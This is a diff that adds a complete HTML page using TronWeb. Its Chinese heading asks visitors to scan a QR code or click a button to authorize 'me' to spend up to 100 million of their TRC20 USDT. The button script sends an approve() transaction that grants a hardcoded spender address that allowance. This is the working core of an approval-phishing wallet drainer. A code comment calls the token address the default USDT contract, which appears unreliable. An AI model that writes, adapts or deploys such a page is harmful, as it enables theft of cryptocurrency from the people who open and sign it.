@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8" />
+  <title>授权TRC20 USDT</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@2.8.2/dist/TronWeb.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; }
+    #qrcode { margin: 20px 0; }
+    button { font-size: 16px; padding: 10px 20px; cursor: pointer; }
+  </style>
+</head>
+<body>
+  <h2>扫码或点击按钮，授权我使用你的 TRC20 USDT（最多 100,000,000）</h2>
+  <div id="qrcode"></div>
+  <button id="authBtn">授权 USDT</button>
+
+  <script>
+    const yourSpender = "TCJYKs5AiBucQFSA4GaovG66pHatv1UxYp";
+    const tokenAddress = "TXYZv9sEmidgBkjK5k8U6UJr4bmdbgbJ6z"; // 默认 USDT TRC20 地址
+    const maxAmount = "100000000000000"; // 1亿 * 10^6
+
+    // 生成二维码（指向本页面）
+    const pageURL = window.location.href;
+    new QRCode(document.getElementById("qrcode"), pageURL);
+
+    document.getElementById("authBtn").onclick = async () => {
+      if (!window.tronWeb || !tronWeb.defaultAddress.base58) {
+        alert("请使用 TronLink 插件或手机钱包扫码打开本页面！");
+        return;
+      }
+      try {
+        const contract = await tronWeb.contract().at(tokenAddress);
+        const tx = await contract.approve(yourSpender, maxAmount).send();
+        alert("授权交易已发起！交易哈希：" + tx);
+      } catch (error) {
+        alert("授权失败：" + error.message);
+      }
+    };
+  </script>
+</body>
+</html>
